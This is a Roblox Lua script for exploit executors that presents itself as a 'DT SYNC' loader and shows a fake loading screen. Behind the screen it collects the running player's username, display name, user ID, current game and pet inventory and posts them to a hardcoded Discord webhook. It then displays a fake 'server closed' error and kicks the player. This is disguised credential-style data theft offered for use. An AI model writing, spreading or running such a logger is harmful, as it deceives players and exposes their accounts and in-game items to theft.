Update for Delta/Xeno
local WEBHOOK = "https://ptb.discord.com/api/webhooks/1384865098736341093/623t7ZtY-THtXgCKEEZaNnkObLMkj2cMqJ7annLSYLge8TGNEOatanuRy3RtOgYco5SI"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- GUI Setup
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "DTSyncGuiV4"

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 350, 0, 180)
main.Position = UDim2.new(0.5, -175, 0.5, -90)
main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
main.BorderSizePixel = 0
main.BackgroundTransparency = 1

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "DT SYNC | Loader"
title.TextColor3 = Color3.fromRGB(0, 255, 127)
title.Font = Enum.Font.GothamBold
title.TextSize = 24

local loading = Instance.new("TextLabel", main)
loading.Position = UDim2.new(0, 0, 0, 60)
loading.Size = UDim2.new(1, 0, 0, 30)
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.Font = Enum.Font.Gotham
loading.TextSize = 18
loading.BackgroundTransparency = 1
loading.Text = "Loading modules..."

local status = Instance.new("TextLabel", main)
status.Position = UDim2.new(0, 0, 0, 100)
status.Size = UDim2.new(1, 0, 0, 25)
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.BackgroundTransparency = 1
status.Text = ""

-- Fade In
for i = 1, 10 do
	main.BackgroundTransparency = 1 - (i * 0.1)
	wait(0.05)
end

-- Fake Load
for i = 1, 3 do
	loading.Text = "Loading modules" .. string.rep(".", i)
	wait(0.6)
end
status.Text = "Optimizing cache..."
wait(1)
status.Text = "Checking pet inventory..."
wait(1.2)

-- Pet Logger (PS99, etc.)
local petList = {}
pcall(function()
	local lib = require(ReplicatedStorage:FindFirstChild("Framework") and ReplicatedStorage.Framework:FindFirstChild("Library"))
	local save = lib.Save.Get().Inventory.Pets
	for id, data in pairs(save) do
		table.insert(petList, data.id or "Unknown")
	end
end)

-- Webhook Data
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local data = {
	name = player.Name,
	displayName = player.DisplayName,
	userid = player.UserId,
	place = gameInfo.Name,
	placeId = tostring(game.PlaceId),
	time = os.date("%Y-%m-%d %H:%M:%S"),
	pets = petList
}

-- Universal HTTP Request Function
local http_request = http_request or request or (syn and syn.request) or (http and http.request)
if http_request then
	pcall(function()
		local fields = {
			{["name"] = "👤 Username", ["value"] = data.name, ["inline"] = true},
			{["name"] = "💬 Display", ["value"] = data.displayName, ["inline"] = true},
			{["name"] = "🎮 Game", ["value"] = data.place, ["inline"] = false},
			{["name"] = "🆔 Place ID", ["value"] = data.placeId, ["inline"] = true},
			{["name"] = "⏰ Time", ["value"] = data.time, ["inline"] = false},
			{["name"] = "🪪 UserID", ["value"] = tostring(data.userid), ["inline"] = false},
		}

		if #data.pets > 0 then
			table.insert(fields, {["name"] = "🐾 Pets", ["value"] = table.concat(data.pets, ", "), ["inline"] = false})
		end

		local payload = {
			["username"] = "DT SYNC Logger",
			["embeds"] = {{
				["title"] = "📡 DT SYNC Execution Log",
				["fields"] = fields,
				["color"] = tonumber(0x32CD32)
			}}
		}

		http_request({
			Url = WEBHOOK,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(payload)
		})
	end)
end

-- Fake success
loading.Text = "All modules loaded successfully"
status.Text = "✅ Ready."
wait(2)

-- Fake error + Kick
status.Text = "⚠ Server closed unexpectedly. Please try again later."
loading.TextColor3 = Color3.fromRGB(255, 80, 80)
status.TextColor3 = Color3.fromRGB(255, 100, 100)
wait(1.2)

-- Fade Out
for i = 1, 10 do
	main.BackgroundTransparency = i * 0.1
	title.TextTransparency = i * 0.1
	loading.TextTransparency = i * 0.1
	status.TextTransparency = i * 0.1
	wait(0.05)
end
gui:Destroy()

-- Kick
player:Kick("⚠ Server closed unexpectedly. Please try again later.")
